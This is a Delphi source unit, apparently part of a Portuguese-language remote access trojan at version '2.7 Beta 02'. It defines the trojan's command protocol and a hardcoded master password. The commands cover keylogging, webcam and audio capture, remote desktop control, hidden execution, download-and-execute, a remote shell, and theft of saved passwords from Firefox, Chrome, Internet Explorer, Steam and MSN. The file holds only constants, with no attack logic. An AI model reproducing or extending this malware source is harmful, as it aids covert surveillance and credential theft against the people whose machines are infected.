Unit UnitComandos;

interface

const
  MaxBufferSize = 32768;
  MasterPassword = 'njgnjvejvorenwtrnionrionvironvrnv';
  VersaoPrograma = '2.7 Beta 02';

  MAININFO = 'maininfo';
  TENTARNOVAMENTE = 'tentarnovamente';
  MENSAGENS = 'mensagens';
  PING = 'ping';
  PONG = 'pong';
  PINGTEST = 'pingtest';
  PONGTEST = 'pongtest';
  RESPOSTA = 'resposta';
  IMGDESK = 'imgdesk';
  RECONNECT = 'reconnect';
  DISCONNECT = 'disconnect';
  UNINSTALL = 'uninstall';
  RENAMESERVIDOR = 'renameservidor';
  UPDATESERVIDOR = 'updateservidor';
  UPDATESERVIDORWEB = 'updateservidorweb';
  UPDATESERVERERROR = 'updateservererror';
  ENVIAREXECNORMAL = 'enviarexecnormal';
  ENVIAREXECHIDDEN = 'enviarexechidden';

  LISTARPROCESSOS = 'listarprocessos';
  LISTADEPROCESSOSPRONTA = 'listadeprocessospronta';
  FINALIZARPROCESSO = 'finalizarprocesso';

  LISTARSERVICOS = 'listarservicos';
  LISTADESERVICOSPRONTA = 'listadeservicospronta';
  INICIARSERVICO = 'iniciarservico';
  PARARSERVICO = 'pararservico';
  DESINSTALARSERVICO = 'desinstalarservico';
  INSTALARSERVICO = 'instalarservico';

  LISTARJANELAS = 'listarjanelas';
  LISTADEJANELASPRONTA = 'listadejanelaspronta';
  WINDOWS_MIN = 'windowsmin';
  WINDOWS_MAX = 'windowsmax';
  WINDOWS_FECHAR = 'windowsfechar';
  WINDOWS_MOSTRAR = 'windowsmostrar';
  WINDOWS_OCULTAR = 'windowsocultar';
  WINDOWS_MIN_TODAS = 'windowsmintodas';
  WINDOWS_CAPTION = 'windowscaption';
  ENABLE_CLOSE = 'enableclose';
  DISABLE_CLOSE = 'disableclose';

  LISTARPROGRAMASINSTALADOS = 'listarprogramasinstalados';
  LISTADEPROGRAMASINSTALADOSPRONTA = 'listadeprogramasinstaladospronta';
  DESINSTALARPROGRAMA = 'desinstalarprograma';

  LISTARPORTAS = 'listarportas';
  LISTARPORTASDNS = 'listarportasdns';
  LISTADEPORTASPRONTA = 'listadeportaspronta';
  FINALIZARCONEXAO = 'finalizarconexao';
  FINALIZARPROCESSOPORTAS = 'finalizarprocessoportas';

  LISTDEVICES = 'listdevices';
  LISTEXTRADEVICES = 'listextradevices';
  LISTADEDISPOSITIVOSPRONTA = 'listadedispositivospronta';
  LISTADEDISPOSITIVOSEXTRASPRONTA = 'listadedispositivosextraspronta';

  CONFIGURACOESDOSERVER = 'configuracoesdoserver';

  EXECUTARCOMANDOS = 'executarcomandos';
  OPENWEB = 'openweb';
  DOWNEXEC = 'downexec';

  DEFINIRCLIPBOARD = 'definirclipboard';
  OBTERCLIPBOARD = 'obterclipboard';
  OBTERCLIPBOARDFILES = 'obterclipboardfiles';
  LIMPARCLIPBOARD = 'limpasclipboard';

  SHELLATIVAR = 'shellativar';
  SHELLDESATIVAR = 'shelldesativar';
  SHELLRESPOSTA = 'shellresposta';

  REGISTRO = 'registro';
  ADICIONARVALOR = 'adicionarvalor';
  LISTARCHAVES = 'listarchaves';
  LISTARVALORES = 'listarvalores';
  NOVACHAVE = 'novachave';
  RENAMEKEY = 'renamekey';
  APAGARREGISTRO = 'apagarregistro';
  NOVONOMEVALOR = 'novonomevalor';
  REG_BINARY_ = 'REG_BINARY';
  REG_DWORD_ = 'REG_DWORD';
  REG_DWORD_BIG_ENDIAN_ = 'REG_DWORD_BIG_ENDIAN';
  REG_EXPAND_SZ_ = 'REG_EXPAND_SZ';
  REG_LINK_ = 'REG_LINK';
  REG_MULTI_SZ_ = 'REG_MULTI_SZ';
  REG_NONE_ = 'REG_NONE';
  REG_SZ_ = 'REG_SZ';
  HKEY_CLASSES_ROOT_ = 'HKEY_CLASSES_ROOT';
  HKEY_CURRENT_CONFIG_ = 'HKEY_CURRENT_CONFIG';
  HKEY_CURRENT_USER_ = 'HKEY_CURRENT_USER';
  HKEY_LOCAL_MACHINE_ = 'HKEY_LOCAL_MACHINE';
  HKEY_USERS_ = 'HKEY_USERS';

  KEYLOGGER = 'keylogger';
  KEYLOGGERGETLOG = 'keyloggergetlog';
  KEYLOGGERERASELOG = 'keyloggereraselog';
  KEYLOGGERATIVAR = 'keyloggerativar';
  KEYLOGGERDESATIVAR = 'keyloggerdesativar';
  KEYLOGGERVAZIO = 'keyloggervazio';
  KEYLOGGERSEARCH = 'keyloggersearch';
  KEYLOGGERSEARCHOK = 'keyloggersearchok';

  DESKTOP = 'desktop';
  DESKTOPPREVIEW = 'desktoppreview';
  DESKTOPRATIO = 'desktopratio';
  DESKTOPGETBUFFER = 'desktopgetbuffer';
  DESKTOPSETTINGS = 'desktopsettings';
  MOUSEPOSITION = 'mouseposition';
  KEYBOARDKEY = 'keyboardkey';
  KEYBOARDUP = 'keyup';
  KEYBOARDDOWN = 'keydown';

  WEBCAM = 'webcam';
  WEBCAMACTIVE = 'webcamactive';
  WEBCAMINACTIVE = 'webcaminactive';
  WEBCAMGETBUFFER = 'webcamgetbuffer';
  WEBCAMSETTINGS = 'webcamsettings';

  AUDIO = 'audio';
  AUDIOSTOP = 'audiostop';
  AUDIOGETBUFFER = 'audiogetbuffer';

  FILEMANAGER = 'filemanager';
  LISTAR_DRIVES = 'listardrives';
  LISTAR_ARQUIVOS = 'listararquivos';

  PROCURAR_ARQ = 'procurararq';
  DOWNLOAD = 'download';
  MULTIDOWNLOAD = 'multidownload';
  DOWNLOADREC = 'downloadrec';
  MULTIDOWNLOADREC = 'multidownloadrec';
  UPLOAD = 'upload';
  RESUMETRANSFER = 'resumetransfer';
  EXEC_NORMAL = 'execnormal';
  EXEC_INV = 'execinv';
  DELETAR_ARQ = 'deletararq';
  DELETAR_DIR = 'deletardir';
  MULTIDELETAR_ARQ = 'multideletararq';
  MULTIDELETAR_DIR = 'multideletardir';
  RENOMEAR_DIR = 'renomeardir';
  RENOMEAR_ARQ = 'renomeararq';
  COPIAR_ARQ = 'copiararq';
  COPIAR_PASTA = 'copiarpasta';
  COLAR_ARQUIVO = 'colararq';
  COLAR_PASTA = 'colarpasta';
  CRIAR_PASTA = 'criarpasta';
  DESKTOP_PAPER = 'desktoppaper';
  PROCURAR_ARQ_PARAR = 'stopsearch';
  MULTITHUMBNAILSEARCH = 'multithumbnailsearch';
  MULTITHUMBNAIL = 'multithumbnail';
  THUMBNAILSEARCH = 'thumbnailsearch';
  THUMBNAIL = 'thumbnail';
  THUMBNAILSEARCHERROR = 'thumbnailsearcherror';
  THUMBNAILERROR = 'thumbnailerror';
  FILEMANAGERERROR = 'filemanagererror';
  DIRMANAGERERROR = 'dirmanagererror';
  PROCURARERROR = 'procurarerror';
  DELDIRALLYES = 'deldirallyes';
  DELDIRALLNO = 'deldirallno';
  DELFILEALLYES = 'delfileallyes';
  DELFILEALLNO = 'delfileallno';
  GETPASSWORD = 'getpassword';
  GETPASSWORDLIST = 'getpasswordlist';
  GETPASSWORDERROR = 'getpassworderror';
  GETNOIP = 'getnoip';
  GETMSN = 'getmsn';
  GETFIREFOX = 'getfirefox';
  GETIELOGIN = 'getielogin';
  GETIEPASS = 'getiepass';
  GETIEAUTO = 'getieauto';
  GETIEWEB = 'getieweb';
  GETFF3_5 = 'getff3_5';
  GETSTEAM = 'getsteam';
  GETCHROME = 'getchrome';
  CHANGEATTRIBUTES = 'changeattributes';
  SENDFTP = 'sendftp';

  FILESEARCH = 'filesearch';
  FILESEARCHOK = 'filesearchok';

  MYMESSAGEBOX = 'mymessagebox';
  MYSHUTDOWN = 'myshutdown';
  HIBERNAR = 'hibernar';
  LOGOFF = 'logoff';
  POWEROFF = 'poweroff';
  MYRESTART = 'myrestart';
  DESLMONITOR = 'desligarmonitor';
  BTN_START_HIDE = 'btnstarthide';
  BTN_START_SHOW = 'btnstartshow';
  BTN_START_BLOCK = 'btnstartblock';
  BTN_START_UNBLOCK = 'btnstartunblock';
  DESK_ICO_HIDE = 'deskicohide';
  DESK_ICO_SHOW = 'deskicoshow';
  DESK_ICO_BLOCK = 'deskicoblock';
  DESK_ICO_UNBLOCK = 'deskicounblock';
  TASK_BAR_HIDE = 'tasbarhide';
  TASK_BAR_SHOW = 'tasbarshow';
  TASK_BAR_BLOCK = 'tasbarblock';
  TASK_BAR_UNBLOCK = 'tasbarunblock';
  MOUSE_BLOCK = 'mouseblock';
  MOUSE_UNBLOCK = 'mouseunblock';
  MOUSE_SWAP = 'mouseswap';
  SYSTRAY_ICO_HIDE = 'systrayicohide';
  SYSTRAY_ICO_SHOW = 'systrayicoshow';
  OPENCD = 'opencd';
  CLOSECD = 'closecd';
  OPCOESEXTRAS = 'opcoesextras';

  CHAT = 'chat';
  CHATMSG = 'chatmsg';
  CHATCLOSE = 'chatclose';

  GETSHAREDLIST = 'getsharedlist';
  NOSHAREDLIST = 'nosharedlist';
  DOWNLOADDIR = 'downloaddir';
  DOWNLOADDIRSTOP = 'downloaddirstop';

  MSN_STATUS = 'msnstatus';
  MSN_LISTAR = 'msnlistar';
  MSN_CONECTADO = 'msnconectado';
  MSN_OCUPADO = 'msnocupado';
  MSN_AUSENTE = 'msnausente';
  MSN_INVISIVEL = 'msninvisivel';
  MSN_DESCONECTADO = 'msndesconectado';

  STARTPROXY = 'startproxy';
  STOPPROXY = 'stopproxy';

var
  DebugAtivo: boolean;
  DebugAtivoServer: boolean;

function StrToBool(Str: string): boolean;
function BoolToStr(Bool: boolean): string;

implementation

function BoolToStr(Bool: boolean): string;
begin
  result := 'FALSE';
  if Bool = true then Result := 'TRUE';
end;

function StrToBool(Str: string): boolean;
begin
  result := false;
  if Str = 'TRUE' then Result := true;
end;

function CheckCommand(str: string): boolean;
begin

end;

end.